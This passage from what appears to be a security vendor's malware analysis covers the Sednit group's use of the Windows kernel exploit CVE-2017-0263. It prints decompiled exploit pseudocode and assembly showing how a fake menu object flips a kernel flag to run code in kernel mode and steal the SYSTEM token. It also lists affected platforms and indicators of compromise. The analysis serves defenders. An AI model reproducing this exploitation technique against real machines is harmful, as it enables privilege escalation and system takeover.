			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 GetClassNameW(tagCWPSTRUCT-&gt;hwnd, &amp;ClassName, 20);
 if ( !wcscmp(&amp;ClassName, STR_SysShadow) )
 {
   if ( ++MenuIndex == 3 )
   {
     // tagWND
     ::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);
     // Replace the WndProc of the object
     SetWindowLongW(tagCWPSTRUCT-&gt;hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);
   }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf2140561772-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf2140561772-2">2</div><div class="crayon-num" data-line="crayon-60581b882caf2140561772-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf2140561772-4">4</div><div class="crayon-num" data-line="crayon-60581b882caf2140561772-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf2140561772-6">6</div><div class="crayon-num" data-line="crayon-60581b882caf2140561772-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf2140561772-8">8</div><div class="crayon-num" data-line="crayon-60581b882caf2140561772-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf2140561772-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf2140561772-1"><span class="crayon-h"> </span><span class="crayon-e">GetClassNameW</span><span class="crayon-sy">(</span><span class="crayon-v">tagCWPSTRUCT</span><span class="crayon-o">-&gt;</span><span class="crayon-v">hwnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">ClassName</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf2140561772-2"><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">wcscmp</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-v">ClassName</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">STR_SysShadow</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caf2140561772-3"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf2140561772-4"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">++</span><span class="crayon-v">MenuIndex</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caf2140561772-5"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf2140561772-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c">// tagWND</span></div><div class="crayon-line" id="crayon-60581b882caf2140561772-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">::</span><span class="crayon-v">wParam</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-e ">_DWORD *</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-e">FN_LeakHandle</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-v">hWnd</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">sizeof_tagWND_0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf2140561772-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c">// Replace the WndProc of the object</span></div><div class="crayon-line" id="crayon-60581b882caf2140561772-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">SetWindowLongW</span><span class="crayon-sy">(</span><span class="crayon-v">tagCWPSTRUCT</span><span class="crayon-o">-&gt;</span><span class="crayon-v">hwnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">GWL_WNDPROC</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">LONG</span><span class="crayon-sy">)</span><span class="crayon-v">FN_TriggerExploit</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf2140561772-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>In this procedure, we can see that the exploit looks for the WM_NCDESTROY message. If the requirements are met, it will build a malicious tagPOPUPMENU object which is described by the following pseudocode:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf4736589103" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ( Msg == WM_NCDESTROY )
 {
   struct tagPOPUPMENU *pm = BuildFakeObject();
   SetClassLongW(..., pm);
 }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf4736589103-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf4736589103-2">2</div><div class="crayon-num" data-line="crayon-60581b882caf4736589103-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf4736589103-4">4</div><div class="crayon-num" data-line="crayon-60581b882caf4736589103-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf4736589103-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">Msg</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">WM</span><span class="crayon-sy">_</span>NCDESTROY<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf4736589103-2"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caf4736589103-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e ">tagPOPUPMENU *</span><span class="crayon-v">pm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">BuildFakeObject</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf4736589103-4"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e">SetClassLongW</span><span class="crayon-sy">(</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">pm</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caf4736589103-5"><span class="crayon-h"> </span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Note that the address used to build this object is within the extra memory allocated at the end of our first <span style="font-family: 'courier new', courier, monospace;">tagWND</span>. Then, the exploit calls <span style="font-family: 'courier new', courier, monospace;">NtUserMNDragLeave</span>, in order to flip the <span style="font-family: 'courier new', courier, monospace;">bServerSideProc</span> bit of our <span style="font-family: 'courier new', courier, monospace;">KernelWnd</span> object. To do so, the function will retrieve a <span style="font-family: 'courier new', courier, monospace;">tagMENUSTATE</span> object using the structure <span style="font-family: 'courier new', courier, monospace;">tagTHREADINFO</span>. The <span style="font-family: 'courier new', courier, monospace;">tagMENUSTATE</span> object contains the address of the menu object being destroyed (<span style="font-family: 'courier new', courier, monospace;">tagMENUSTATE-&gt;pGlobalPopupMenu</span>).</p>
<p><img class="aligncenter size-large wp-image-93309" src="/wp-content/uploads/2017/05/8-LPE-tagTHREADINFO_tagPOPUPMENU_extramem-1024x452.png" alt="" width="1024" height="452" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/8-LPE-tagTHREADINFO_tagPOPUPMENU_extramem-1024x452.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/8-LPE-tagTHREADINFO_tagPOPUPMENU_extramem-300x132.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/8-LPE-tagTHREADINFO_tagPOPUPMENU_extramem-768x339.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/05/8-LPE-tagTHREADINFO_tagPOPUPMENU_extramem.png 1443w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>As you can see, the <span style="font-family: 'courier new', courier, monospace;">tagPOPUPMENU</span> is the malicious object we crafted in user space before calling <span style="font-family: 'courier new', courier, monospace;">NtUserMNDragLeave</span>. Looking at the fields in the malicious <span style="font-family: 'courier new', courier, monospace;">tagPOPUPMENU</span>, we can see that they all points in the extra memory except one, which points into our <span style="font-family: 'courier new', courier, monospace;">KernelWnd</span> object.</p>
<p><img class="aligncenter size-full wp-image-93310" src="/wp-content/uploads/2017/05/9-tagPOPUPMENU_during_destroy_edited.png" alt="" width="672" height="554" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/9-tagPOPUPMENU_during_destroy_edited.png 672w, https://www.welivesecurity.com/wp-content/uploads/2017/05/9-tagPOPUPMENU_during_destroy_edited-300x247.png 300w" sizes="(max-width: 672px) 100vw, 672px" /></p>
<p>From here, the execution will reach the function <span style="font-family: 'courier new', courier, monospace;">MNFreePopup</span>, which takes a pointer to a <span style="font-family: 'courier new', courier, monospace;">tagPOPUPMENU</span> object. Eventually this function will call <span style="font-family: 'courier new', courier, monospace;">HMAssignmentUnlock</span>, passing the fields <span style="font-family: 'courier new', courier, monospace;">spwndNextPopup</span> and <span style="font-family: 'courier new', courier, monospace;">spwndPrevPopup</span> as argument:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf5196080378" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
; win32k!HMAssignmentUnlock
rsp,28h
mov     rdx,qword ptr [rcx]
and     qword ptr [rcx],0
test    rdx,rdx
je      win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
add     dword ptr [rdx+8],0FFFFFFFFh; Flipping bServerSideProc
jne     win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
movzx   eax,word ptr [rdx]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf5196080378-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf5196080378-2">2</div><div class="crayon-num" data-line="crayon-60581b882caf5196080378-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf5196080378-4">4</div><div class="crayon-num" data-line="crayon-60581b882caf5196080378-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf5196080378-6">6</div><div class="crayon-num" data-line="crayon-60581b882caf5196080378-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf5196080378-8">8</div><div class="crayon-num" data-line="crayon-60581b882caf5196080378-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf5196080378-1"><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">win32k</span><span class="crayon-o">!</span><span class="crayon-e">HMAssignmentUnlock</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf5196080378-2"><span class="crayon-v">rsp</span><span class="crayon-sy">,</span><span class="crayon-cn">28h</span></div><div class="crayon-line" id="crayon-60581b882caf5196080378-3"><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">rdx</span><span class="crayon-sy">,</span><span class="crayon-e">qword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">rcx</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf5196080378-4"><span class="crayon-st">and</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">qword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">rcx</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-60581b882caf5196080378-5"><span class="crayon-e">test&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rdx</span><span class="crayon-sy">,</span><span class="crayon-e">rdx</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf5196080378-6"><span class="crayon-e">je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">win32k</span><span class="crayon-o">!</span><span class="crayon-v">HMAssignmentUnlock</span><span class="crayon-o">+</span><span class="crayon-cn">0x4f</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">fffff960</span><span class="crayon-sy">`</span><span class="crayon-cn">00119adf</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caf5196080378-7"><span class="crayon-e">add&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">rdx</span><span class="crayon-o">+</span><span class="crayon-cn">8</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-cn">0FFFFFFFFh</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Flipping </span><span class="crayon-e">bServerSideProc</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf5196080378-8"><span class="crayon-e">jne&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">win32k</span><span class="crayon-o">!</span><span class="crayon-v">HMAssignmentUnlock</span><span class="crayon-o">+</span><span class="crayon-cn">0x4f</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">fffff960</span><span class="crayon-sy">`</span><span class="crayon-cn">00119adf</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caf5196080378-9"><span class="crayon-e">movzx&nbsp;&nbsp; </span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-t">word</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">rdx</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>After the execution of the syscall, our <span style="font-family: 'courier new', courier, monospace;">tagWND</span> structure associated with our <span style="font-family: 'courier new', courier, monospace;">KernelWnd</span> looks like this:</p>
<p><a href="/wp-content/uploads/2017/05/10-tagWND_flip.png"><img class="aligncenter size-full wp-image-93311" src="/wp-content/uploads/2017/05/10-tagWND_flip.png" alt="" width="721" height="525" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/10-tagWND_flip.png 721w, https://www.welivesecurity.com/wp-content/uploads/2017/05/10-tagWND_flip-300x218.png 300w" sizes="(max-width: 721px) 100vw, 721px" /></a></p>
<p>Everything is set! The exploit just needs to send the right message in order to trigger the execution of our procedure in kernel mode.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf7535664851" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
syscall(NtUserMNDragLeave, 0, 0);
 // Send a message to the procedure in order to trigger its execution in kernel mode.
 KernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0);
 Status.Triggered = KernelCallbackResult == 0x9F9F;
 if ( KernelCallbackResult != 0x9F9F )
   // Error, try again.
   PostMessageW(TargetWindow, 0xABCDu, 0, 0);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf7535664851-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf7535664851-2">2</div><div class="crayon-num" data-line="crayon-60581b882caf7535664851-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf7535664851-4">4</div><div class="crayon-num" data-line="crayon-60581b882caf7535664851-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf7535664851-6">6</div><div class="crayon-num" data-line="crayon-60581b882caf7535664851-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf7535664851-1"><span class="crayon-e">syscall</span><span class="crayon-sy">(</span><span class="crayon-v">NtUserMNDragLeave</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf7535664851-2"><span class="crayon-h"> </span><span class="crayon-c">// Send a message to the procedure in order to trigger its execution in kernel mode.</span></div><div class="crayon-line" id="crayon-60581b882caf7535664851-3"><span class="crayon-h"> </span><span class="crayon-v">KernelCallbackResult</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">SendMessageW</span><span class="crayon-sy">(</span><span class="crayon-v">KernelWnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x9F9Fu</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">::</span><span class="crayon-v">wParam</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf7535664851-4"><span class="crayon-h"> </span><span class="crayon-v">Status</span><span class="crayon-sy">.</span><span class="crayon-v">Triggered</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">KernelCallbackResult</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">0x9F9F</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caf7535664851-5"><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">KernelCallbackResult</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">0x9F9F</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf7535664851-6"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-c">// Error, try again.</span></div><div class="crayon-line" id="crayon-60581b882caf7535664851-7"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e">PostMessageW</span><span class="crayon-sy">(</span><span class="crayon-v">TargetWindow</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0xABCDu</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Finally, the window procedure running with elevated privileges will steal the <span style="font-family: 'courier new', courier, monospace;">SYSTEM</span> token and add it to the calling process. After successfully running the exploit, FLTLDR.EXE should run with <span style="font-family: 'courier new', courier, monospace;">SYSTEM</span> privileges, and will install Seduploader’s payload</p>
<h2><strong>Summary</strong></h2>
<p>This campaign shows us that Sednit has not ceased its activities. They still keep their old habits: using known attack methods, reusing code from other malware or public websites, and making small mistakes such as typos in Seduploader’s configuration (<span style="font-family: 'courier new', courier, monospace;">shel</span> instead of <span style="font-family: 'courier new', courier, monospace;">shell</span>).</p>
<p>Also usual is the fact that they once again improved their toolset, this time adding some built-in features such as the screenshotter and integrating two new zero-day exploits into their arsenal.</p>
<h2><strong>Platforms affected by CVE-2017-0262 and CVE-2017-0263 (according to Microsoft)</strong></h2>
<h3>CVE-2017-0262</h3>
<ul>
<li>Microsoft Office 2010 Service Pack 2 (32-bit editions)</li>
<li>Microsoft Office 2010 Service Pack 2 (64-bit editions)</li>
<li>Microsoft Office 2013 Service Pack 1 (32-bit editions)</li>
<li>Microsoft Office 2013 Service Pack 1 (64-bit editions)</li>
<li>Microsoft Office 2013 RT Service Pack 1</li>
<li>Microsoft Office 2016 (32-bit edition)</li>
<li>Microsoft Office 2016 (64-bit edition)</li>
</ul>
<p>Microsoft advises all customers to follow the guidance in security advisory <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170005">ADV170005</a> as a defense-in-depth measure against EPS filter vulnerabilities.</p>
<h3>CVE-2017-0263</h3>
<ul>
<li>Windows 7 for 32-bit Systems Service Pack 1</li>
<li>Windows 7 for x64-based Systems Service Pack 1</li>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
<li>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</li>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
<li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 (Server Core installation)</li>
<li>Windows 8.1 for 32-bit systems</li>
<li>Windows 8.1 for x64-based systems</li>
<li>Windows Server 2012 R2</li>
<li>Windows RT 8.1</li>
<li>Windows Server 2012 R2 (Server Core installation)</li>
<li>Windows 10 for 32-bit Systems</li>
<li>Windows 10 for x64-based Systems</li>
<li>Windows 10 Version 1511 for x64-based Systems</li>
<li>Windows 10 Version 1511 for 32-bit Systems</li>
<li>Windows Server 2016</li>
<li>Windows 10 Version 1607 for 32-bit Systems</li>
<li>Windows 10 Version 1607 for x64-based Systems</li>
<li>Windows Server 2016 (Server Core installation)</li>
<li>Windows 10 Version 1703 for 32-bit Systems</li>
<li>Windows 10 Version 1703 for x64-based Systems</li>
<li>Windows Server 2008 for Itanium-Based Systems Service Pack 2</li>
<li>Windows Server 2008 for 32-bit Systems Service Pack 2</li>
<li>Windows Server 2008 for x64-based Systems Service Pack 2&lt;</li>
<li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li>
</ul>
<h2><strong>IoCs</strong></h2>
<p>Also available on <a href="https://github.com/eset/malware-ioc/blob/master/sednit/2017-05-09_Trump_Attack_on_Syria_IoCs.adoc">ESET&#8217;s Github</a>.</p>

<table id="tablepress-317" class="tablepress tablepress-id-317">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">ESET detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><tt>d5235d136cfcadbef431eea7253d80bde414db9d</tt></td><td class="column-2">Trump's_Attack_on_Syria_English.docx</td><td class="column-3">Win32/Exploit.Agent.NWZ</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><tt>18b7dd3917231d7bae93c11f915e9702aa5d1bbb</tt></td><td class="column-2">image1.eps</td><td class="column-3">Win32/Exploit.Agent.NWZ</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><tt>6a90e0b5ec9970a9f443a7d52eee4c16f17fcc70</tt></td><td class="column-2">joiner.dll</td><td class="column-3">Win32/Exploit.Agent.NWV</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><tt>e338d49c270baf64363879e5eecb8fa6bdde8ad9</tt></td><td class="column-2">apisecconnect.dll</td><td class="column-3">Win32/Sednit.BG</td>
</tr>
</tbody>
</table>

